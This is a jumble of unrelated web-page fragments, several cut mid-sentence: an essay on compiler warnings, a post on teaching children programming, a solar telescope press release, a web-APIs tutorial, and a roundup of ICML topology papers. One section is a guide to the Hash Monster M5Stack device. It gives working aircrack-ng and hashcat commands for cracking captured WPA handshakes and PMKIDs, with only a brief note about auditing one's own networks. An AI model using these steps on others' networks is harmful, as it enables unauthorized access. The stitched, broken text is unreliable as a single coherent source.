There are some pieces of code that clearly intend to express X, such as <code>(!a)==(b)</code>.
There are some that clearly intend to express Y, such as <code>a != b</code>.
But you wrote <code>(!a==b)</code>, which falls into a gray area: it’s not clear which of
X and Y you really intended to express.</p>

<p>The job of the compiler-diagnostic-developer is to create some separation between
the space of inputs that the compiler considers “clearly X”
and the space of inputs that the compiler considers “clearly Y.”
Essentially, we create an error-correcting code by deliberately increasing the
<a href="https://en.wikipedia.org/wiki/Hamming_distance">edit distance</a>
between pairs of inequivalent C++ programs — deliberately increasing the number of keystrokes
the programmer would have to screw up in order to transform a working (and warning-free)
C++ program into an inequivalent broken (yet warning-free) C++ program.</p>

<p>Furthermore, in cases where Y is more commonly intended than X, it should be relatively <em>easier</em>
to write Y than X. In our example that’s true even at the core-language level: <code>a != b</code> is
already easier to write than <code>!a == b</code>. But when we increase the distance between X-space and Y-space,
we shrink X-space by more than we shrink Y-space. If you really intend to express <code>!a == b</code>, we’ll force you
to retreat all the way to <code>(!a) == b</code>. This is kind of analogous to the
<a href="https://en.wikipedia.org/wiki/Signalling_(economics)">signaling principle</a>
in economics or evolutionary biology: Basically, if you want the compiler to accept your intent,
your code must adopt some cumbersome and frankly maladaptive ornamentation in order to <em>prove</em>
its worthiness to the compiler.</p>

<p>According to the prevailing theory of
<a href="https://en.wikipedia.org/wiki/Handicap_principle">sexual selection in the animal kingdom</a>,
when a peahen is deciding whether to accept
a particular peacock, she uses …</p></div></div>

Most of them had little to no experience with programming.</p>
<h2 id="we-knew-this-was-going-to-be-a-challenging-task-but-we-were-certain-we-could-do-it">We knew this was going to be a challenging task, but we were certain we could do it.</h2>
<p>That is why we decided to teach them in a way which most programmers learn:</p>
<ol>
<li>The students would daily watch a video tutorial and follow instructions in it</li>
<li>They would then solve challenges curated by our team</li>
<li>Every weekend a doubt solving session was held wherein the concepts were quickly brushed upon and you guessed it, doubts were cleared</li>
</ol>
<p>Now here are my main takeaways:</p>
<h2 id="1-teaching-takes-patience-a-lot-of-patience">1. Teaching takes patience, A LOT OF PATIENCE!</h2>
<p>Especially younger students require spoon-feeding at times.
Resources which were given to them had to be boiled down enough for them to grasp it. </p>
<h2 id="2-having-clear-fundamentals-is-very-important">2. Having clear fundamentals is very important.</h2>
<p>Basic things like knowing what is an integer, string, variable etc. are very important, otherwise programming at a later stage becomes very difficult. </p>

<p>To put it bluntly, programming is very very tough.

<p>All went well and in the end we were able to help all the students to get a feel for what programming feels, our goal was not make full-stack 12-year-old prodigies who work at Facebook but to get them excited about programming and I feel we achieved our goal very well.</p>
<p>Hope you found this post insightful.
Have an awesome day, Cheers.</p>

ESP32 is a series of dual-core up to 240Mhz, low-cost, low-power system on a chip microcontroller with integrated Wi-Fi and dual-mode Bluetooth/BLE.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/ac7ba2d12ae49bb808d323edae91463b7f97656872f7d24c91dab86d4ba1653d.jpeg"></p><p>Pwnagotchi is a tamagochi like device powered by bettercap and running on a Raspberry Pi Zero W that learns from its surrounding WiFi environment in order to maximize the crackable WPA key material it captures (either through passive sniffing or by performing deauthentication and association attacks). This material is collected on disk as PCAP files containing any form of handshake supported by hashcat, including full and half WPA handshakes as well as PMKIDs. Or put quickly, it's a tamagochi who eats WiFi handshakes to be happy.</p><p>Hash Monster runs in a smaller size and cheaper platform superior to the Pwnagotchi in several aspects. While Pwnagotchi is based on the Raspberry Pi Zero and requires assembling a DIY kit with various components such as an eInk screen and an external powerbank, the Hash Monster works on directly on the tiny M5Stack device. M5 Stack couples an ESP32 with a small LCD display, buttons and internal battery. It’s a modular, stackable, scalable, and portable device which is powered with an ESP-32 core, which makes it open source, low cost, full-function, and easy for developers to handle ESP32 IoT product development. You can program M5Stack through Arduino, C++, Blockly or MicroPython to name a few. The complete development kit for M5 Stack just under $45 provides a friendly price and full-featured resources which makes it a good starter kit for you to explore ESP32. While the M5 Stack includes a built-in battery 110mAh, it can be upgraded with a stackable 700 mAh lipo battery extension module.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/615059260bcadb5085e71de543154bec6c52222f5d1efda91cdcafdbe403cce2.png"></p><p>The similarity between Pwnagotchi and Hash Monster is that they capture both PSK handshakes from WPA / WPA2 networks and PSK hashes contained in beacon frames with PMKID. A great advantage of PMKID cracking is that everything you need is available over the air even if there are no stations connected and only a single packet capture is required. Later we can crack these hashes with standard tools such as aircrack or hashcat, and thus obtain the credentials. Of course, we should only do this in networks that we manage ourselves or that we have permission to audit.</p><p><strong>The process.</strong></p><p>Hardware requirements:</p><ul><li><a href="https://bit.ly/3jFAnl8" target="_blank" rel="nofollow noopener">M5Stack CORE Development Kit</a> with built-in 110mAh Battery ($45)</li></ul><p>Optionally:</p><ul><li><a href="https://bit.ly/3gYtI48" target="_blank" rel="nofollow noopener">Extended Battery M5Stack Core Development Kit Capacity 700mAh Stackable Module</a> (USD$12)</li><li><a href="https://www.banggood.com/M5Stack-Multi-function-Digital-Watch-with-700mAh-Battery-for-M5Stack-ESP32-Core-p-1551727.html?rmmds=search&amp;cur_warehouse=CN" target="_blank" rel="nofollow noopener">Smart Watch Module with 700mAh Battery for M5Stack ESP32 Core</a> ($15)</li></ul><p>The software installation is pretty straight forward:</p><p>1.Setup Arduino IDE environment.</p><p><em>M5Stack Arduino IDE Setup in 5 minutes <a href="https://www.youtube.com/watch?v=U2es-l4z2Zg" target="_blank" rel="nofollow noopener">https://www.youtube.com/watch?v=U2es-l4z2Zg</a></em></p><p>2.

We will do this with two known tools – Aircrack-ng and Hashcat, which relies respectively on CPU and GPU power. We will be running these tools from linux, even though they are both found in a Windows version as well. Remember to use recent versions to benefit from the PMKID attack in addition to the traditional cracking of handshakes.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/adb3724e47a02d9fe14b83454cae422f882a9c99ccc78f0f2db6ef6e7a7f6f9b.png"></p><p>Aircrack-ng can be used for very basic dictionary attacks running on your CPU. Before you run the attack you need a wordlist. I recommend using the infamous rockyou dictionary file:</p><p># download the 134MB rockyou dictionary file</p><pre><code><code>curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></code></pre><p>Note, that if the network password is not in the wordlist you will not crack the password.</p><p># -a2 specifies WPA2, -b is the BSSID, -w is the wordfile</p><pre><code><code>aircrack-ng -a2 -b AC:FC:E3:C9:AB:C0 -w rockyou.txt 3.cap</code></code></pre><p>If the password is cracked you will see a KEY FOUND! message in the terminal followed by the plain text version of the network password.</p><p>Cracking an WiFi password using brute force attack for a long WiFi password without GPUs or Cloud help, will be a nightmare but if the password is short or you know the key pattern it will be "easily" cracked.</p><p>Here you have a small guide for linux (Ubuntu) to crack the WiFi password using the files stored on the SD_Card of the Purple Hash Monster using your computer.</p><p>First we need to install <strong>hashcat</strong></p><pre><code><code>sudo apt-get update</code><br>
<code> sudo apt install hashcat</code></code></pre><p>EAPOL/PMKID stored on the SD-Card are <em>pcap</em> files, we have to convert to <em>hccapx</em> format to work with hashcat. In terminal from the directory were we have the <em>pcap</em> file from the SD-CARD:</p><pre><code><code>wget https://raw.githubusercontent.com/hashcat/hashcat-utils/master/src/cap2hccapx.c</code><br>
<code> gcc -o cap2hccapx cap2hccapx.c</code><br>
<code> ./cap2hccapx 1.pcap 1.hccapx</code></code></pre><p>For example if we know that the wifi password has a lenght of 8 digits we can run the following command, and in few seconds we will have the WiFi Password :)</p><pre><code><code>hashcat --force -m 2500 -a 3 -1 ?d -o cracked 1.hccapx ?1?1?1?1?1?1?1?1</code></code></pre><p><strong>Final notes</strong></p><p>Although in my case I exclusively use the M5 Stack for the pocket monster hash, there are undoubtedly several projects that run on the M5 Stack and you will certainly want to take a look if you are interested in wifi and bluetooth security attack tools for this platform.</p><p>M5 Stack WiFi SSID Scanner by Elkentaro</p><p><a href="https://github.com/elkentaro/M5_SSID_scanner_collector" target="_blank" rel="nofollow noopener">https://github.com/elkentaro/M5_SSID_scanner_collector</a></p><p>Covid Sniffer: BLE COVID exposure app sniffer using M5 Stack</p><p><a href="https://gitlab.com/mschmidl/covidsniffer" target="_blank" rel="nofollow noopener">https://gitlab.com/mschmidl/covidsniffer</a></p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/02ee78aa44062073eb950642e19a44a548daf55d3217643f1a98cc84d37bc7d6.jpeg"></p></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
          <h2>GREGOR, the largest solar telescope in Europe, which is operated by a German consortium and located on Teide Observatory, Spain, has obtained unprecedented images of the fine-structure of the Sun. Following a major redesign of GREGOR’s optics, carried out by a team of scientists and engineers from the Leibniz Institute for Solar Physics (KIS), the Sun can be observed at a higher resolution than before from Europe.</h2>
        </p><div>
        <p>press release, Sep 1, 2020
</p>

<p>The Sun is our star and has a profound influence on our planet, life, and civilization. By studying the magnetism on the Sun, we can understand its influence on Earth and minimize damage of satellites and technological infrastructure. The GREGOR telescope allows scientists to resolve details as small as 50 km on the Sun, which is a tiny fraction of the solar diameter of 1.4 million km. This is as if one saw a needle on a soccer field perfectly sharp from a distance of one kilometer.
</p>


<p>“This was a very exciting, but also extremely challenging project. In only one year we completely redesigned the optics, mechanics, and electronics to achieve the best possible image quality.” said Dr. Lucia Kleint, who led the project and the German solar telescopes on Tenerife. &nbsp;A major technical breakthrough was achieved by the project team in March this year, during the lockdown, when they were stranded at the observatory and set up the optical laboratory from the ground up. Unfortunately, snow storms prevented solar observations. When Spain reopened in July, the team immediately flew back and obtained the highest resolution images of the Sun ever taken by a European telescope.
</p>

<p>Prof. Dr. Svetlana Berdyugina, professor at the Albert-Ludwig University of Freiburg and Director of the Leibniz Institute for Solar Physics (KIS), is very happy about the outstanding results: “The project was rather risky because such telescope upgrades usually take years, but the great team work and meticulous planning have led to this success. Now we have a powerful instrument to solve puzzles on the Sun.” The new optics of the telescope will allow scientists to study magnetic fields, convection, turbulence, solar eruptions, and sunspots in great detail. First light images obtained in July 2020 reveal astonishing details of sunspot evolution and intricate structures in solar plasma. &nbsp;
</p>


<p>Telescope optics are very complex systems of mirrors, lenses, glass cubes, filters and further optical elements. If only one element is not perfect, for example due to fabrication issues, the performance of the whole system suffers. This is similar to wearing glasses with the wrong prescription, resulting in a blurry vision. Unlike for glasses, it is however very challenging to detect which elements in a telescope may be causing issues. The GREGOR team found several of those issues and calculated optics models to solve them. For example, astigmatism is one of such optical problems, which affects 30-60% people’s vision, but also complex telescopes. At GREGOR this was corrected by replacing two elements with so-called off-axis parabolic mirrors, which had to be polished to 6 nm precision, about 1/10000 of the diameter of a hair. Combined with several further enhancements the redesign led to the sharp vision of the telescope. A technical description of the redesign was recently published by the Astronomy &amp; Astrophysics journal in a recent article led by Dr. L. Kleint.
</p>



<p>European researchers have access to observations with the GREGOR telescope through national programs and a program funded by the European commission. New scientific observations are starting in September 2020. 
</p>

<p>Albert-Ludwig University Freiburg founded in 1457 offers undergraduate and graduate studies in all important disciplines today. The Leibniz Institute for Solar Physics (KIS) located in Freiburg is a public foundation and a member of the Leibniz Association. It carries out fundamental research on the Sun and other stars.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><code>API</code> is the acronym for Application Programming Interface which defines interactions between multiple software architecture layers. Programmers carry out complex tasks easily using APIs in software development. Without APIs, a programmer's life would have been miserable with no proper(security, for example) access to data,  knowing unnecessary low level details etc.</p>
<p>When it comes to Web APIs, there are extremely useful  objects, properties and functions available to perform tasks as minor as accessing DOM to as complex as managing audios, videos, graphics, etc. </p>

<p>If you are from the web development background, you are using many of them already. Here is the list of very well known web APIs.</p>
<ul>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">Canvas</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/History_API">History</a> </li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API">Geolocation</a> </li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model">DOM</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Console_API">Console</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API">Drag &amp; Drop API</a></li>
</ul>
<p>In this article, I am going to talk about 10 more web APIs that are not so popular. Lesser popular doesn't mean, they are not useful. You can use them in various use-cases of your project. Please have a look.</p>

<p>If you would like to jump into the source code or see the demonstration immediately, here are the quick links to them:</p>
<blockquote>
<ul>
<li><a target="_blank" href="https://github.com/atapas/demolab/tree/master/code/src/demos/web-apis">Link to the Source Code @GitHub</a></li>
<li><a target="_blank" href="https://demo.greenroots.info/categories/web-apis/">Link to the Web API DemoLab</a></li>
</ul>
</blockquote>
<p>Note: Web APIs are nothing but the interfaces, functions, objects, properties written and exposed using vanilla JavaScript. However the usage of the web APIs is not limited to the vanilla JavaScript based application alone. It is very straightforward to use them with an Angular, React or Vue based applications as well.</p>
<p>All the examples I have used to demonstrate the web apis in this article are written using reactjs. You can find them in the github link mentioned above. Please feel free to fork, change and use!</p>

<p>A big (pain) point about  using a web API is, most of them are not standardized yet. It means, the support for a web API  may differ from one browser vendor to another. For example, You may find an API working with the Chrome browser but, not supported by Firefox or Edge browsers yet.</p>
<p>I would suggest a couple of ways to have a check on this,</p>


<p>Alright, time to get started knowing them. Hope you also find these useful.</p>
<h2 id="1-fullscreen-api">1. 📺 Fullscreen API</h2>
<p>Do you have the need to show any of the DOM elements in full-screen mode? The full-screen use-case is very demanding for gaming applications, online video platforms(like, youtube) etc. </p>
<p>The <code>Fullscreen API</code> provides methods to present a specific Element (and its children) in a full-screen mode. There is a method available to exit full-screen mode once it is no longer needed. Not only that, this API can also help to perform any actions when a DOM element transition into a full-screen mode or comes out of it.</p>
<p>In the example below, my favorite Santa Claus can get into the full-screen mode and come out of it with ease.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598715764074/fR7trCfsA.gif?auto=format,compress&amp;gif-q=60" alt="full_screen.gif"></p>
<p>In the code below, the <code>manageFullScreen()</code> function uses  the <code>requestFullscreen()</code> API on an element which is having an id called, <code>fs_id</code>. </p>
<pre><code><span>const</span> manageFullscreen = () =&gt; {
   <span>document</span>.getElementById(<span>'fs_id'</span>).requestFullscreen();
}
</code></pre>
<p>This element with id, <code>fs_id</code> is a <code>DIV</code> with a child element, i.e, the Santa Clause image.</p>
<pre><code>&lt;div className=<span>"column"</span>&gt;
  <span><span>&lt;<span>div</span> <span>id</span>=<span>"fs_id"</span>&gt;</span>
    <span>&lt;<span>Img</span> <span>fixed</span>=<span>{imageData.image.childImageSharp.fixed}</span> <span>alt</span>=<span>"santa"</span> /&gt;</span>
   <span>&lt;/<span>div</span>&gt;</span>

    <span>&lt;<span>StyledButton</span> 
         <span>onClick</span>=<span>{manageFullscreen}</span>&gt;</span>
            Enter Fullscreen with Santa
    <span>&lt;/<span>StyledButton</span>&gt;</span>
 <span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>You can check if the <code>Fullscreen API</code> is supported by the browser,</p>
<pre><code><span>if</span> (<span>document</span>.fullscreenEnabled) {
   setSupported(<span>true</span>);
} <span>else</span> {
   setSupported(<span>false</span>);
}
</code></pre>
<p>Also watch out for the useful handlers like,</p>
<ul>
<li><code>onfullscreenchange</code>: An event handler for the fullscreenchange event.</li>
<li><code>onfullscreenerror</code>: An event handler for the fullscreenerror event.</li>
</ul>

<h2 id="2-clipboard-async-api">2. 📋 Clipboard Async API</h2>
<p>What is a clipboard in comuping?</p>
<blockquote>
<p>The clipboard is a buffer that some operating systems provide for short-term storage and transfer within and between application programs.</p>
</blockquote>
<p>There are mainly three operations you can perform with the clipboard. They are, <code>copy</code>, <code>cut</code> and <code>paste</code>. The Clipboard API provides the ability to respond to these three operations. </p>
<p>Interestingly, copying content to the clipboard is open as in, there is no need of a user permission. However, for pasting the content from the clipboard to the user application, the user needs to grant permission for it. It is achieved using another web API called, <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API">Permission API</a></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598716493747/PwPwDDK8Y.png?auto=format&amp;q=60" alt="image.png"></p>
<p>Here is a simple example of the copy-paste operation,</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598716547383/PoXUNZmnr.gif?auto=format,compress&amp;gif-q=60" alt="clip_board.gif"></p>
<p>This is how to check if the feature is supported by the browser,</p>
<pre><code><span>if</span> (navigator.clipboard 
     &amp;&amp; navigator.clipboard.read 
     &amp;&amp; navigator.clipboard.write) {
   setSupported(<span>true</span>);
} <span>else</span> {
   setSupported(<span>false</span>);
}
</code></pre>
<p>Here is the async API function for writing the content to the clipboard,</p>
<pre><code><span>async</span> <span><span>function</span> <span>performCopy</span>(<span>event</span>) </span>{
   event.preventDefault();
   <span>try</span> {
      <span>await</span> navigator.clipboard.writeText(copyText);
      <span>console</span>.log(<span>`<span>${copyText}</span> copied to clipboard`</span>);
   } <span>catch</span> (err) {
      <span>console</span>.error(<span>'Failed to copy: '</span>, err);
   }
}
</code></pre>
<p>The Async API function to read the content from the clipboard and do something with it,</p>
<pre><code><span>async</span> <span><span>function</span> <span>performPaste</span>(<span>event</span>) </span>{
   event.preventDefault();
   <span>try</span> {
       <span>const</span> text = <span>await</span> navigator.clipboard.readText();
       setPastetext(text);
       <span>console</span>.log(<span>'Pasted content: '</span>, text);
   } <span>catch</span> (err) {
      <span>console</span>.error(<span>'Failed to read clipboard contents: '</span>, err);
   }
}
</code></pre>
<p>Note: With the inclusion of the <code>Clipboard Async API</code>, you can get rid of the usage of <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand">document.execCommad()</a> function as it is obsolete now.</p>

<h2 id="3-resize-observer-api">3. 🧐 Resize Observer API</h2>
<p>Do you want to take some actions based on the changes to the content or border box of a DOM element? Are you thinking of writing a handler by yourself? What if I tell you, there is already one provided by the web API implementation?</p>
<p>Here is a story about a dumb button. We use a range slider to resize the button. While the button gets resized, we also want to control the text color, without letting the button know much about it. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717277220/dITL6Nog2.gif?auto=format,compress&amp;gif-q=60" alt="resizer.gif"></p>
<p>First, create a button and specify an id so that, we can access the button later using the id.</p>
<pre><code>&lt;StyledButton id=<span>"dumbBtnId"</span>&gt;
   I am a Dumb Button
&lt;<span>/StyledButton&gt;</span>
</code></pre>
<p>Now we create a slider using the <code>range</code> input type from HTML5. A <code>resize()</code> function is invoked when the slider value changes.</p>
<pre><code>&lt;div&gt;
   <span><span>&lt;<span>input</span> 
         <span>onChange</span>=<span>{(event)</span> =&gt;</span> resize(event)} 
         type="range" 
         min={minRange} 
         max={maxRange} 
         defaultValue={rangeValue} /&gt;
<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>The <code>resize()</code> function simply sets the width of the button as the slider range value so that, it can be resized dynamically.</p>
<pre><code><span>const</span> resize = event =&gt; {
   <span>const</span> value = event.target.valueAsNumber;
   setRangeValue(value);
   <span>let</span> dumbBtn = <span>document</span>.getElementById(<span>'dumbBtnId'</span>);
   dumbBtn.style.width = <span>`<span>${value}</span>px`</span>;
 }
</code></pre>
<p>So far, so good? Now for every range value change, the button gets resized. We have a <code>ResizeObserver</code> observing this change and change the color of the button text.</p>
<pre><code>useEffect(() =&gt; {
   <span>try</span> {
            <span>let</span> dumbBtn = <span>document</span>.getElementById(<span>'dumbBtnId'</span>);
            <span>var</span> resizeObserver = <span>new</span> ResizeObserver(entries =&gt; {
                <span>for</span>(<span>const</span> entry <span>of</span> entries) {
                    
                    
                   entry.target.style.color = <span>'green`;
                }
      });
      resizeObserver.observe(dumbBtn);
   } catch(e) {
            setSupported(false);
            console.log(e);      
   }
}, [rangeValue]);</span>
</code></pre>

<h2 id="4-image-capture-api">4. 📷 Image Capture API</h2>
<p>There are some cool and useful APIs around user media like, audio, video etc. I love the <code>Image Capture API</code> which helps us to capture an image or grab a frame from the video devices(like webcam). Not only that, you can also perform actions on capturing an image or grabbing a frame.</p>
<p>First, get the user media access. In this case we are getting the webcam access.</p>
<pre><code>navigator.mediaDevices.getUserMedia({video: <span>true</span>})
  .then(mediaStream =&gt; {
     <span>document</span>.querySelector(<span>'video'</span>).srcObject = mediaStream;
     <span>const</span> track = mediaStream.getVideoTracks()[<span>0</span>];
     setTrack(track);
  }).catch(error =&gt; {
     <span>console</span>.error(<span>` <span>${error}</span> is not yet supported`</span>);
     setError(error);
});
</code></pre>
<p>Just like the clipboard paste operation, a webcam media access permission has to be granted by the user.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717565379/MCRNY49Tl.png?auto=format&amp;q=60" alt="image.png"></p>
<p>Now Grab a frame and do something. In this example, I am just drawing the frame on a Canvas.</p>
<pre><code><span>const</span> imageCapture = <span>new</span> ImageCapture(track);
    imageCapture.grabFrame()
      .then(imageBitmap =&gt; {
          <span>const</span> canvas = <span>document</span>.querySelector(<span>'#grabFrameCanvas'</span>);
          drawCanvas(canvas, imageBitmap);
    }).catch(error =&gt; {
          <span>console</span>.log(error);
          setError(error);
});
</code></pre>
<p>I can also take a picture and do the similar thing.</p>
<pre><code><span>const</span> imageCapture = <span>new</span> ImageCapture(track);
    imageCapture.takePhoto().then(blob =&gt; createImageBitmap(blob))
      .then(imageBitmap =&gt; {
          <span>const</span> canvas = <span>document</span>.querySelector(<span>'#takePhotoCanvas'</span>);
          drawCanvas(canvas, imageBitmap);
    }).catch(error =&gt; {
          <span>console</span>.log(error);
          setError(error);
});
</code></pre>
<p>To stop the video streaming from the webcam, just call he method <code>stop()</code> on the running video track.</p>
<pre><code><span>const</span> videoOff = () =&gt; {
   track.stop();
 }
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717833234/MPOxVZ92M.png?auto=format&amp;q=60" alt="chrome_Umvi16wUlu.png"></p>
<p>Also watch out for the methods,</p>
<ul>
<li><code>getPhotoCapabilities()</code>: To get the ranges of available configuration options.</li>
<li><code>getPhotoSettings()</code>: To get the current photo configuration settings.</li>
</ul>

<h2 id="5-broadcast-channel-api">5. 📡 Broadcast Channel API</h2>
<p>The <code>Broadcast Channel API</code> allows communication between browsing contexts (windows, tabs, iframes) and workers on the <strong>same origin</strong>.

        <p>With this year’s <a href="https://icml.cc/Conferences/2020">International Conference on Machine Learning&nbsp;(ICML)</a>
being over, it is time to have another instalment of this series.
Similar to <a href="http://bastian.rieck.me/blog/posts/2019/icml_tda_roundup/">last year’s post</a>, I shall cover
several papers that caught my attention because of their use of
topological concepts—however, <em>unlike</em> last year, I shall not
restrict the selection to papers using <a href="https://en.wikipedia.org/wiki/Topological_data_analysis">topological data analysis&nbsp;(TDA)</a>.</p>
<p><strong>Caveat lector:</strong> I might have missed some promising papers. Any
suggestions for additions are more than welcome! Please reach out

<p><a href="https://arxiv.org/abs/2002.04881">Learning Flat Latent Manifolds with VAEs</a>
by <a href="https://argmax.ai/team/nutan-chen">Nutan Chen</a>, <a href="https://www.argmax.ai/team/alexej-klushyn">Alexej Klushyn</a>,
Francesco Ferroni, <a href="http://bayerj.github.io/">Justin Bayer</a>, and
<a href="https://argmax.ai/team/patrick-van-der-smagt">Patrick van der Smagt</a>
discusses an interesting modification of variational autoencoders, viz.
an extended loss term that regularises the latent space to be
<em>flat</em>&nbsp;(i.e. having no <a href="https://en.wikipedia.org/wiki/Curvature">curvature</a>).
The main idea is to ensure that the <a href="https://en.wikipedia.org/wiki/Metric_tensor">Riemannian metric tensor</a>
is the identity matrix.</p>
<p>The ingenious implication of such a latent space is that the Euclidean
distance is a good proxy for the similarity between data points, whereas
this is <em>not</em> a priori the case for other latent spaces. It is interesting
to note that there is a ‘sibling’ paper to this one, which was published
at ICLR 2020, namely <a href="https://openreview.net/pdf?id=S1g6xeSKDS">Mixed-curvature Variational Autoencoders</a>.
This paper presents an autoencoder whose latent space is a product of
Riemannian manifolds, whose curvature is either fixed or learnable.</p>
<p>I am glad to see that curvature is starting to attract more attention
from the machine learning community. It is such a fundamental property
of a manifold but can influence the validity of many calculations in
latent spaces. It also has some beneficial properties for <a href="https://openreview.net/pdf?id=BylEqnVFDB">graph
classification</a>, but this is
maybe a better topic for a subsequent post!</p>

    <img src="https://bastian.rieck.me/images/icml20_hoferb.png" alt="Graph Filtration Learning" width="500"> 
</figure>

</div>
<p><a href="https://arxiv.org/abs/1905.10996">Graph Filtration Learning</a> by
<a href="https://www.researchgate.net/profile/Christoph_Hofer8">Christoph Hofer</a>,
<a href="https://www.uni-salzburg.at/index.php?id=213185&amp;L=1">Florian Graf</a>,
<a href="https://bastian.rieck.me/">Bastian Rieck</a>,
<a href="http://wwwx.cs.unc.edu/~mn/?q=content/overview">Marc Niethammer</a>, and
<a href="https://rkwitt.github.io/">Roland Kwitt</a> is arguably<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> the first step
towards properly integrating topological features into neural networks
for graph classification! Briefly put, we developed a homological
<code>READOUT</code> function&nbsp;(to use the parlance of graph neural networks)
that gives rise to a learnable filter function—a <em>filtration</em>.</p>
<p>This concept might be unknown to some readers, but a filtration in this
context is a scalar-valued function on the vertices of a graph that
permits <em>sorting</em> it. Filtrations serve as the backbone for many
topology-based algorithms, primarily for the aforementioned <a href="https://christian.bock.ml/posts/persistent_homology/">persistent homology</a>,
which permits us to study multi-scale topological
features&nbsp;(connected components, cycles, etc.) of an object.
Prior to this paper, filtrations were pre-defined or chosen based on
some target function, such as the vertex degree function of a graph. Our
approach changes this—leading to a filtration that is learnable in an
end-to-end fashion and thus specifically designed for a classification
problem.</p>
<p>We manage to achieve this by first initialising our filter function
based on a regular graph neural network; essentially, one level of
message passing between nodes is sufficient. This provides us with
a non-trivial filter function whose performance we can subsequently
adjust by calculating the topological features induced by said filter,
and vectorising the resulting representations. Since each of these steps
is differentiable<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, the resulting function is also differentiable,
making it possible to adjust the filter for the best classification
results.</p>
<p>I would recommend this paper to anyone who is interested in learning
more about the benefits that a topology-based perspective brings to
certain application problems. Being able to learn the <em>right</em> topological features
to classify a set of graphs opens up exciting opportunities.</p>

<p><a href="https://arxiv.org/abs/2002.04805">Topologically Densified Distributions</a>
by <a href="https://www.researchgate.net/profile/Christoph_Hofer8">Christoph Hofer</a>,
<a href="https://www.uni-salzburg.at/index.php?id=213185&amp;L=1">Florian Graf</a>,
<a href="http://wwwx.cs.unc.edu/~mn/?q=content/overview">Marc Niethammer</a>, and
<a href="https://rkwitt.github.io/">Roland Kwitt</a> studies regularisation properties of
over-parametrised neural networks in the context of small sample-size learning.
This is achieved by studying the properties of latent
representations&nbsp;(the paper uses the term <em>internal representation</em>,
but this is equivalent). More precisely, generalisation properties are
analysed via the <a href="https://en.wikipedia.org/wiki/Pushforward_measure">push-forward probability measure</a>
induced by the latent representation&nbsp;(or <em>encoding</em>).</p>
<p>The authors show that probability mass concentration around training
samples in the latent space is linked to the generalisation capabilities
of a model, but, even more exciting, such a concentration can be achieved by applying
topological constraints on samples from that space! In the context of
this paper, such constraints pertain to measuring the <em>connectivity</em> of
samples. This is achieved using <a href="https://christian.bock.ml/posts/persistent_homology/">persistent homology</a>, specifically,
by calculating a zero-dimensional Vietoris–Rips complex—if you are
not familiar with this term, just think of a minimum spanning tree.</p>
<p>What I particularly enjoyed about this paper is that it starts providing
solid answers to fundamental concepts in machine learning. All too often,
we remain in the realm of the empirical and just <em>observe</em> whether our
network generalises. This paper ventures into hitherto-unknown territories
and gives us a theoretical justification!</p>

<p><a href="https://arxiv.org/abs/1906.00722">Topological Autoencoders</a> by
<a href="https://michaelmoor.ml/">Michael Moor</a>,
<a href="https://expectationmax.github.io/">Max Horn</a>,
<a href="https://bastian.rieck.me/">Bastian Rieck</a>, and
<a href="https://bsse.ethz.ch/mlcb/karsten.html">Karsten Borgwardt</a> deals with
regularising the latent space in terms of its topology. More precisely,
we preserve the topological features of the input data in the respective
latent space&nbsp;(on the batch level, respectively). While we restrict
our experiments to connected components for now&nbsp;(so no cycles
yet, even though our method generalises to higher dimensions),
our approach makes it possible to create latent representations
that ‘mimic’ the topological features of the input.</p>
<p>This leads to a nice plug-and-play loss term that can be easily
integrated into most architectures, and we can demonstrate that, among
others, it considerably improves the quality of a ‘vanilla’ autoencoder
architecture. To achieve this goal, we had to solve all kinds of
interesting adventures, one of them being how to make everything
differentiable. Interestingly, we end up with a similar necessary
condition for differentiability than for the graph filtration learning
paper, viz. the pairwise distances between different samples of the
input batch need to be <em>unique</em>.</p>
<p>The coolest feature of our method is that it technically <em>only</em> requires
a distance metric between input samples<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, nothing more—no feature
vector representation or anything. It can thus conceivably be used to
represent the topology of any object you fancy&nbsp;(including
documents, images, and graphs).</p>
<p>If you are interested in a beautifully-animated high-level introduction
to this publication, you should take the time to read Michael’s <a href="https://michaelmoor.ml/blog/topoae/main/">blog post on our paper</a>.</p>

<a href="https://danilorezende.com/">Danilo Jimenez Rezende</a>,
<a href="https://gpapamak.github.io/">George Papamakarios</a>,

<a href="https://web.mit.edu/physics/people/faculty/shanahan_phiala.html">Phiala E.  Shanahan</a>,
and <a href="http://theoryandpractice.org/">Kyle Cranmer</a>
